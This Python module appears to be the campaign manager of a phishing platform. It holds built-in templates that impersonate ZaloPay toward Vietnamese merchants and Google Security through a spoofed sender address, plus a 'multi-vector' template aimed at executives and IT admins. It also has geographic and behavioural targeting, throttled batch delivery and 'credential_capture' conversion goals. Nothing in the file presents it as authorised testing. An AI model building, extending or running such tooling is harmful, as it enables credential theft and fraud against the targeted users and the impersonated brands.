"""
Campaign Orchestration Engine
Advanced campaign management with creation wizard, targeting, and lifecycle management
"""

import os
import json
import time
import secrets
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
from enum import Enum
from dataclasses import dataclass, asdict
import uuid

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class CampaignStatus(Enum):
    """Campaign status enumeration"""
    DRAFT = "draft"
    SCHEDULED = "scheduled"
    ACTIVE = "active"
    PAUSED = "paused"
    COMPLETED = "completed"
    CANCELLED = "cancelled"
    FAILED = "failed"

class CampaignType(Enum):
    """Campaign type enumeration"""
    PHISHING_EMAIL = "phishing_email"
    OAUTH_CAPTURE = "oauth_capture"
    CREDENTIAL_HARVEST = "credential_harvest"
    BEEF_EXPLOITATION = "beef_exploitation"
    COMPREHENSIVE = "comprehensive"

class TargetingMethod(Enum):
    """Targeting method enumeration"""
    GEOGRAPHIC = "geographic"
    DOMAIN_BASED = "domain_based"
    INDUSTRY_BASED = "industry_based"
    BEHAVIORAL = "behavioral"
    CUSTOM_LIST = "custom_list"

@dataclass
class CampaignTargeting:
    """Campaign targeting configuration"""
    method: TargetingMethod
    countries: List[str]
    industries: List[str]
    domains: List[str]
    company_sizes: List[str]
    job_titles: List[str]
    custom_email_list: List[str]
    behavioral_patterns: List[str]
    risk_levels: List[str]
    exclude_domains: List[str]
    exclude_countries: List[str]

@dataclass
class CampaignContent:
    """Campaign content configuration"""
    landing_page_template: str
    email_template: str
    subject_line: str
    sender_name: str
    sender_email: str
    logo_url: str
    color_scheme: str
    custom_css: str
    custom_js: str
    tracking_pixels: List[str]
    social_proof_elements: List[str]

@dataclass
class CampaignDelivery:
    """Campaign delivery configuration"""
    start_time: datetime
    end_time: Optional[datetime]
    timezone: str
    delivery_schedule: str  # immediate, scheduled, drip
    batch_size: int
    delay_between_batches: int
    max_recipients_per_hour: int
    retry_failed_deliveries: bool
    max_retries: int

@dataclass
class CampaignAnalytics:
    """Campaign analytics configuration"""
    track_opens: bool
    track_clicks: bool
    track_conversions: bool
    track_geolocation: bool
    track_device_info: bool
    track_browser_info: bool
    conversion_goals: List[str]
    success_metrics: List[str]

@dataclass
class Campaign:
    """Complete campaign configuration"""
    campaign_id: str
    name: str
    description: str
    campaign_type: CampaignType
    status: CampaignStatus
    created_by: str
    created_at: datetime
    updated_at: datetime
    
    # Campaign components
    targeting: CampaignTargeting
    content: CampaignContent
    delivery: CampaignDelivery
    analytics: CampaignAnalytics
    
    # Campaign settings
    budget_limit: Optional[float]
    success_criteria: Dict[str, Any]
    failure_thresholds: Dict[str, Any]
    auto_pause_conditions: List[str]
    auto_complete_conditions: List[str]
    
    # Campaign metadata
    tags: List[str]
    notes: str
    version: int
    parent_campaign_id: Optional[str]
    cloned_from: Optional[str]

class CampaignOrchestrator:
    """Advanced campaign orchestration engine"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.active_campaigns = {}
        self.campaign_templates = {}
        self.targeting_engines = {}
        
        # Initialize targeting engines
        self._initialize_targeting_engines()
        
        # Load campaign templates
        self._load_campaign_templates()
    
    def _initialize_targeting_engines(self):
        """Initialize targeting engines"""
        try:
            from engines.targeting.geographic_targeting import GeographicTargetingEngine
            from engines.targeting.domain_targeting import DomainTargetingEngine
            from engines.targeting.industry_targeting import IndustryTargetingEngine
            from engines.targeting.behavioral_targeting import BehavioralTargetingEngine
            
            self.targeting_engines = {
                TargetingMethod.GEOGRAPHIC: GeographicTargetingEngine(self.mongodb, self.redis),
                TargetingMethod.DOMAIN_BASED: DomainTargetingEngine(self.mongodb, self.redis),
                TargetingMethod.INDUSTRY_BASED: IndustryTargetingEngine(self.mongodb, self.redis),
                TargetingMethod.BEHAVIORAL: BehavioralTargetingEngine(self.mongodb, self.redis)
            }
            
            logger.info("Targeting engines initialized")
            
        except ImportError as e:
            logger.warning(f"Some targeting engines not available: {e}")
            # Create mock engines for development
            self.targeting_engines = {}
    
    def _load_campaign_templates(self):
        """Load predefined campaign templates"""
        self.campaign_templates = {
            "zalopay_merchant": {
                "name": "ZaloPay Merchant Registration",
                "type": CampaignType.OAUTH_CAPTURE,
                "description": "Target Vietnamese merchants for ZaloPay registration",
                "targeting": {
                    "method": TargetingMethod.GEOGRAPHIC,
                    "countries": ["Vietnam"],
                    "industries": ["retail", "ecommerce", "restaurant", "service"],
                    "company_sizes": ["small", "medium", "large"]
                },
                "content": {
                    "landing_page_template": "zalopay_merchant_registration",
                    "email_template": "zalopay_welcome_email",
                    "subject_line": "Đăng ký ZaloPay Merchant - Ưu đãi đặc biệt",
                    "sender_name": "ZaloPay Support",
                    "sender_email": "support@zalopay.vn",
                    "color_scheme": "zalopay_brand"
                },
                "delivery": {
                    "delivery_schedule": "immediate",
                    "batch_size": 100,
                    "delay_between_batches": 300,
                    "max_recipients_per_hour": 500
                }
            },
            "google_oauth_phish": {
                "name": "Google OAuth Phishing",
                "type": CampaignType.OAUTH_CAPTURE,
                "description": "Generic Google OAuth credential capture",
                "targeting": {
                    "method": TargetingMethod.DOMAIN_BASED,
                    "domains": ["gmail.com", "googlemail.com"],
                    "exclude_domains": ["google.com", "youtube.com"]
                },
                "content": {
                    "landing_page_template": "google_oauth_login",
                    "email_template": "google_security_alert",
                    "subject_line": "Security Alert: Unusual Activity Detected",
                    "sender_name": "Google Security",
                    "sender_email": "security@google.com",
                    "color_scheme": "google_brand"
                }
            },
            "comprehensive_attack": {
                "name": "Comprehensive Multi-Vector Attack",
                "type": CampaignType.COMPREHENSIVE,
                "description": "Full-spectrum attack with OAuth, BeEF, and Gmail exploitation",
                "targeting": {
                    "method": TargetingMethod.BEHAVIORAL,
                    "behavioral_patterns": ["high_value_targets", "executives", "it_admins"],
                    "risk_levels": ["high", "critical"]
                },
                "content": {
                    "landing_page_template": "multi_vector_landing",
                    "email_template": "executive_targeting",
                    "subject_line": "Urgent: System Security Update Required",
                    "sender_name": "IT Security Team",
                    "sender_email": "security@company.com"
                }
            }
        }
    
    def create_campaign_wizard(self, admin_id: str, template_id: str = None, custom_config: Dict[str, Any] = None) -> Campaign:
        """Create campaign using wizard interface"""
        try:
            # Generate campaign ID
            campaign_id = f"campaign_{uuid.uuid4().hex[:12]}"
            
            # Start with template if provided
            if template_id and template_id in self.campaign_templates:
                template = self.campaign_templates[template_id]
                campaign_data = self._create_campaign_from_template(campaign_id, template, admin_id)
            else:
                campaign_data = self._create_custom_campaign(campaign_id, custom_config or {}, admin_id)
            
            # Validate campaign configuration
            validation_result = self._validate_campaign_config(campaign_data)
            if not validation_result["valid"]:
                raise ValueError(f"Campaign validation failed: {validation_result['errors']}")
            
            # Save campaign to database
            self._save_campaign(campaign_data)
            
            logger.info(f"Campaign created: {campaign_id} by admin {admin_id}")
            return campaign_data
            
        except Exception as e:
            logger.error(f"Error creating campaign: {e}")
            raise
    
    def _create_campaign_from_template(self, campaign_id: str, template: Dict[str, Any], admin_id: str) -> Campaign:
        """Create campaign from template"""
        now = datetime.now(timezone.utc)
        
        return Campaign(
            campaign_id=campaign_id,
            name=template["name"],
            description=template["description"],
            campaign_type=template["type"],
            status=CampaignStatus.DRAFT,
            created_by=admin_id,
            created_at=now,
            updated_at=now,
            
            targeting=CampaignTargeting(**template["targeting"]),
            content=CampaignContent(**template["content"]),
            delivery=CampaignDelivery(
                start_time=now,
                end_time=None,
                timezone="Asia/Ho_Chi_Minh",
                delivery_schedule=template["delivery"]["delivery_schedule"],
                batch_size=template["delivery"]["batch_size"],
                delay_between_batches=template["delivery"]["delay_between_batches"],
                max_recipients_per_hour=template["delivery"]["max_recipients_per_hour"],
                retry_failed_deliveries=True,
                max_retries=3
            ),
            analytics=CampaignAnalytics(
                track_opens=True,
                track_clicks=True,
                track_conversions=True,
                track_geolocation=True,
                track_device_info=True,
                track_browser_info=True,
                conversion_goals=["oauth_completion", "credential_capture"],
                success_metrics=["conversion_rate", "engagement_rate"]
            ),
            
            budget_limit=None,
            success_criteria={"min_conversions": 10, "min_conversion_rate": 0.05},
            failure_thresholds={"max_failure_rate": 0.8, "max_bounce_rate": 0.3},
            auto_pause_conditions=["high_bounce_rate", "low_conversion_rate"],
            auto_complete_conditions=["target_reached", "time_expired"],
            
            tags=["template_based"],
            notes=f"Created from template: {template['name']}",
            version=1,
            parent_campaign_id=None,
            cloned_from=None
        )
    
    def _create_custom_campaign(self, campaign_id: str, config: Dict[str, Any], admin_id: str) -> Campaign:
        """Create custom campaign from configuration"""
        now = datetime.now(timezone.utc)
        
        # Extract configuration sections
        targeting_config = config.get("targeting", {})
        content_config = config.get("content", {})
        delivery_config = config.get("delivery", {})
        analytics_config = config.get("analytics", {})
        
        return Campaign(
            campaign_id=campaign_id,
            name=config.get("name", f"Campaign {campaign_id}"),
            description=config.get("description", ""),
            campaign_type=CampaignType(config.get("type", "oauth_capture")),
            status=CampaignStatus.DRAFT,
            created_by=admin_id,
            created_at=now,
            updated_at=now,
            
            targeting=CampaignTargeting(
                method=TargetingMethod(targeting_config.get("method", "geographic")),
                countries=targeting_config.get("countries", []),
                industries=targeting_config.get("industries", []),
                domains=targeting_config.get("domains", []),
                company_sizes=targeting_config.get("company_sizes", []),
                job_titles=targeting_config.get("job_titles", []),
                custom_email_list=targeting_config.get("custom_email_list", []),
                behavioral_patterns=targeting_config.get("behavioral_patterns", []),
                risk_levels=targeting_config.get("risk_levels", []),
                exclude_domains=targeting_config.get("exclude_domains", []),
                exclude_countries=targeting_config.get("exclude_countries", [])
            ),
            content=CampaignContent(
                landing_page_template=content_config.get("landing_page_template", "default"),
                email_template=content_config.get("email_template", "default"),
                subject_line=content_config.get("subject_line", "Important Update"),
                sender_name=content_config.get("sender_name", "System Administrator"),
                sender_email=content_config.get("sender_email", "admin@company.com"),
                logo_url=content_config.get("logo_url", ""),
                color_scheme=content_config.get("color_scheme", "default"),
                custom_css=content_config.get("custom_css", ""),
                custom_js=content_config.get("custom_js", ""),
                tracking_pixels=content_config.get("tracking_pixels", []),
                social_proof_elements=content_config.get("social_proof_elements", [])
            ),
            delivery=CampaignDelivery(
                start_time=datetime.fromisoformat(delivery_config.get("start_time", now.isoformat())),
                end_time=datetime.fromisoformat(delivery_config["end_time"]) if delivery_config.get("end_time") else None,
                timezone=delivery_config.get("timezone", "UTC"),
                delivery_schedule=delivery_config.get("delivery_schedule", "immediate"),
                batch_size=delivery_config.get("batch_size", 50),
                delay_between_batches=delivery_config.get("delay_between_batches", 60),
                max_recipients_per_hour=delivery_config.get("max_recipients_per_hour", 200),
                retry_failed_deliveries=delivery_config.get("retry_failed_deliveries", True),
                max_retries=delivery_config.get("max_retries", 3)
            ),
            analytics=CampaignAnalytics(
                track_opens=analytics_config.get("track_opens", True),
                track_clicks=analytics_config.get("track_clicks", True),
                track_conversions=analytics_config.get("track_conversions", True),
                track_geolocation=analytics_config.get("track_geolocation", True),
                track_device_info=analytics_config.get("track_device_info", True),
                track_browser_info=analytics_config.get("track_browser_info", True),
                conversion_goals=analytics_config.get("conversion_goals", ["oauth_completion"]),
                success_metrics=analytics_config.get("success_metrics", ["conversion_rate"])
            ),
            
            budget_limit=config.get("budget_limit"),
            success_criteria=config.get("success_criteria", {}),
            failure_thresholds=config.get("failure_thresholds", {}),
            auto_pause_conditions=config.get("auto_pause_conditions", []),
            auto_complete_conditions=config.get("auto_complete_conditions", []),
            
            tags=config.get("tags", []),
            notes=config.get("notes", ""),
            version=1,
            parent_campaign_id=config.get("parent_campaign_id"),
            cloned_from=config.get("cloned_from")
        )
    
    def _validate_campaign_config(self, campaign: Campaign) -> Dict[str, Any]:
        """Validate campaign configuration"""
        errors = []
        warnings = []
        
        # Validate targeting
        if not campaign.targeting.countries and not campaign.targeting.domains and not campaign.targeting.custom_email_list:
            errors.append("At least one targeting method must be specified")
        
        # Validate content
        if not campaign.content.landing_page_template:
            errors.append("Landing page template is required")
        
        if not campaign.content.email_template:
            errors.append("Email template is required")
        
        # Validate delivery
        if campaign.delivery.start_time < datetime.now(timezone.utc):
            warnings.append("Campaign start time is in the past")
        
        if campaign.delivery.end_time and campaign.delivery.end_time <= campaign.delivery.start_time:
            errors.append("End time must be after start time")
        
        # Validate analytics
        if not campaign.analytics.conversion_goals:
            warnings.append("No conversion goals specified")
        
        return {
            "valid": len(errors) == 0,
            "errors": errors,
            "warnings": warnings
        }
    
    def _save_campaign(self, campaign: Campaign):
        """Save campaign to database"""
        try:
            if not self.mongodb:
                logger.warning("MongoDB not available, campaign not saved")
                return
            
            collection = self.mongodb.campaigns
            campaign_doc = asdict(campaign)
            
            # Convert enums to strings
            campaign_doc["campaign_type"] = campaign.campaign_type.value
            campaign_doc["status"] = campaign.status.value
            campaign_doc["targeting"]["method"] = campaign.targeting.method.value
            
            # Convert datetime objects
            campaign_doc["created_at"] = campaign.created_at
            campaign_doc["updated_at"] = campaign.updated_at
            campaign_doc["delivery"]["start_time"] = campaign.delivery.start_time
            if campaign.delivery.end_time:
                campaign_doc["delivery"]["end_time"] = campaign.delivery.end_time
            
            collection.insert_one(campaign_doc)
            logger.info(f"Campaign saved to database: {campaign.campaign_id}")
            
        except Exception as e:
            logger.error(f"Error saving campaign: {e}")
            raise
    
    def get_campaign(self, campaign_id: str) -> Optional[Campaign]:
        """Get campaign by ID"""
        try:
            if not self.mongodb:
                return None
            
            collection = self.mongodb.campaigns
            campaign_doc = collection.find_one({"campaign_id": campaign_id})
            
            if campaign_doc:
                return self._document_to_campaign(campaign_doc)
            
            return None
            
        except Exception as e:
            logger.error(f"Error getting campaign: {e}")
            return None
    
    def _document_to_campaign(self, doc: Dict[str, Any]) -> Campaign:
        """Convert MongoDB document to Campaign object"""
        # Convert string enums back to enum objects
        doc["campaign_type"] = CampaignType(doc["campaign_type"])
        doc["status"] = CampaignStatus(doc["status"])
        doc["targeting"]["method"] = TargetingMethod(doc["targeting"]["method"])
        
        # Convert datetime strings back to datetime objects
        doc["created_at"] = doc["created_at"]
        doc["updated_at"] = doc["updated_at"]
        doc["delivery"]["start_time"] = doc["delivery"]["start_time"]
        if doc["delivery"].get("end_time"):
            doc["delivery"]["end_time"] = doc["delivery"]["end_time"]
        
        return Campaign(**doc)
    
    def list_campaigns(self, admin_id: str = None, status: CampaignStatus = None, limit: int = 50) -> List[Campaign]:
        """List campaigns with optional filtering"""
        try:
            if not self.mongodb:
                return []
            
            collection = self.mongodb.campaigns
            query = {}
            
            if admin_id:
                query["created_by"] = admin_id
            
            if status:
                query["status"] = status.value
            
            cursor = collection.find(query).sort("created_at", -1).limit(limit)
            campaigns = []
            
            for doc in cursor:
                campaigns.append(self._document_to_campaign(doc))
            
            return campaigns
            
        except Exception as e:
            logger.error(f"Error listing campaigns: {e}")
            return []
    
    def update_campaign(self, campaign_id: str, updates: Dict[str, Any]) -> bool:
        """Update campaign configuration"""
        try:
            if not self.mongodb:
                return False
            
            collection = self.mongodb.campaigns
            
            # Add update timestamp
            updates["updated_at"] = datetime.now(timezone.utc)
            
            # Convert enums to strings if present
            if "campaign_type" in updates:
                updates["campaign_type"] = updates["campaign_type"].value
            if "status" in updates:
                updates["status"] = updates["status"].value
            if "targeting" in updates and "method" in updates["targeting"]:
                updates["targeting"]["method"] = updates["targeting"]["method"].value
            
            result = collection.update_one(
                {"campaign_id": campaign_id},
                {"$set": updates}
            )
            
            return result.modified_count > 0
            
        except Exception as e:
            logger.error(f"Error updating campaign: {e}")
            return False
    
    def start_campaign(self, campaign_id: str) -> bool:
        """Start a campaign"""
        try:
            campaign = self.get_campaign(campaign_id)
            if not campaign:
                return False
            
            if campaign.status != CampaignStatus.DRAFT and campaign.status != CampaignStatus.PAUSED:
                logger.warning(f"Cannot start campaign {campaign_id} with status {campaign.status}")
                return False
            
            # Update status to active
            success = self.update_campaign(campaign_id, {
                "status": CampaignStatus.ACTIVE,
                "delivery.start_time": datetime.now(timezone.utc)
            })
            
            if success:
                # Initialize campaign execution
                self._initialize_campaign_execution(campaign)
                logger.info(f"Campaign started: {campaign_id}")
            
            return success
            
        except Exception as e:
            logger.error(f"Error starting campaign: {e}")
            return False
    
    def pause_campaign(self, campaign_id: str) -> bool:
        """Pause a campaign"""
        try:
            campaign = self.get_campaign(campaign_id)
            if not campaign:
                return False
            
            if campaign.status != CampaignStatus.ACTIVE:
                logger.warning(f"Cannot pause campaign {campaign_id} with status {campaign.status}")
                return False
            
            # Update status to paused
            success = self.update_campaign(campaign_id, {
                "status": CampaignStatus.PAUSED
            })
            
            if success:
                # Stop campaign execution
                self._stop_campaign_execution(campaign_id)
                logger.info(f"Campaign paused: {campaign_id}")
            
            return success
            
        except Exception as e:
            logger.error(f"Error pausing campaign: {e}")
            return False
    
    def complete_campaign(self, campaign_id: str) -> bool:
        """Complete a campaign"""
        try:
            campaign = self.get_campaign(campaign_id)
            if not campaign:
                return False
            
            # Update status to completed
            success = self.update_campaign(campaign_id, {
                "status": CampaignStatus.COMPLETED,
                "delivery.end_time": datetime.now(timezone.utc)
            })
            
            if success:
                # Stop campaign execution
                self._stop_campaign_execution(campaign_id)
                # Generate final analytics
                self._generate_campaign_report(campaign_id)
                logger.info(f"Campaign completed: {campaign_id}")
            
            return success
            
        except Exception as e:
            logger.error(f"Error completing campaign: {e}")
            return False
    
    def clone_campaign(self, campaign_id: str, new_name: str, admin_id: str) -> Optional[Campaign]:
        """Clone an existing campaign"""
        try:
            original_campaign = self.get_campaign(campaign_id)
            if not original_campaign:
                return None
            
            # Create new campaign ID
            new_campaign_id = f"campaign_{uuid.uuid4().hex[:12]}"
            
            # Clone campaign data
            cloned_campaign = Campaign(
                campaign_id=new_campaign_id,
                name=new_name,
                description=f"Cloned from {original_campaign.name}",
                campaign_type=original_campaign.campaign_type,
                status=CampaignStatus.DRAFT,
                created_by=admin_id,
                created_at=datetime.now(timezone.utc),
                updated_at=datetime.now(timezone.utc),
                
                targeting=original_campaign.targeting,
                content=original_campaign.content,
                delivery=original_campaign.delivery,
                analytics=original_campaign.analytics,
                
                budget_limit=original_campaign.budget_limit,
                success_criteria=original_campaign.success_criteria,
                failure_thresholds=original_campaign.failure_thresholds,
                auto_pause_conditions=original_campaign.auto_pause_conditions,
                auto_complete_conditions=original_campaign.auto_complete_conditions,
                
                tags=original_campaign.tags + ["cloned"],
                notes=f"Cloned from {original_campaign.campaign_id}",
                version=1,
                parent_campaign_id=original_campaign.campaign_id,
                cloned_from=campaign_id
            )
            
            # Save cloned campaign
            self._save_campaign(cloned_campaign)
            
            logger.info(f"Campaign cloned: {campaign_id} -> {new_campaign_id}")
            return cloned_campaign
            
        except Exception as e:
            logger.error(f"Error cloning campaign: {e}")
            return None
    
    def get_campaign_templates(self) -> Dict[str, Dict[str, Any]]:
        """Get available campaign templates"""
        return self.campaign_templates
    
    def get_campaign_analytics(self, campaign_id: str) -> Dict[str, Any]:
        """Get campaign analytics"""
        try:
            # This would integrate with the analytics system
            # For now, return mock data
            return {
                "campaign_id": campaign_id,
                "total_sent": 1000,
                "total_opened": 250,
                "total_clicked": 100,
                "total_converted": 25,
                "open_rate": 0.25,
                "click_rate": 0.10,
                "conversion_rate": 0.025,
                "bounce_rate": 0.05,
                "unsubscribe_rate": 0.01,
                "geographic_distribution": {
                    "Vietnam": 800,
                    "United States": 100,
                    "Other": 100
                },
                "device_distribution": {
                    "mobile": 600,
                    "desktop": 350,
                    "tablet": 50
                },
                "timeline": [
                    {"timestamp": "2024-01-01T00:00:00Z", "sent": 100, "opened": 25, "clicked": 10, "converted": 2},
                    {"timestamp": "2024-01-01T01:00:00Z", "sent": 100, "opened": 30, "clicked": 12, "converted": 3}
                ]
            }
            
        except Exception as e:
            logger.error(f"Error getting campaign analytics: {e}")
            return {}
    
    def _initialize_campaign_execution(self, campaign: Campaign):
        """Initialize campaign execution"""
        try:
            # Add to active campaigns
            self.active_campaigns[campaign.campaign_id] = {
                "campaign": campaign,
                "start_time": datetime.now(timezone.utc),
                "status": "running"
            }
            
            # Initialize targeting
            if campaign.targeting.method in self.targeting_engines:
                targeting_engine = self.targeting_engines[campaign.targeting.method]
                targeting_engine.initialize_targeting(campaign.targeting)
            
            logger.info(f"Campaign execution initialized: {campaign.campaign_id}")
            
        except Exception as e:
            logger.error(f"Error initializing campaign execution: {e}")
    
    def _stop_campaign_execution(self, campaign_id: str):
        """Stop campaign execution"""
        try:
            if campaign_id in self.active_campaigns:
                del self.active_campaigns[campaign_id]
                logger.info(f"Campaign execution stopped: {campaign_id}")
            
        except Exception as e:
            logger.error(f"Error stopping campaign execution: {e}")
    
    def _generate_campaign_report(self, campaign_id: str):
        """Generate final campaign report"""
        try:
            # This would generate a comprehensive report
            # For now, just log the completion
            logger.info(f"Generating final report for campaign: {campaign_id}")
            
        except Exception as e:
            logger.error(f"Error generating campaign report: {e}")

# Global campaign orchestrator instance
campaign_orchestrator = None

def initialize_campaign_orchestrator(mongodb_connection=None, redis_client=None) -> CampaignOrchestrator:
    """Initialize campaign orchestrator"""
    global campaign_orchestrator
    campaign_orchestrator = CampaignOrchestrator(mongodb_connection, redis_client)
    return campaign_orchestrator

def get_campaign_orchestrator() -> CampaignOrchestrator:
    """Get campaign orchestrator instance"""
    global campaign_orchestrator
    if campaign_orchestrator is None:
        campaign_orchestrator = CampaignOrchestrator()
    return campaign_orchestrator
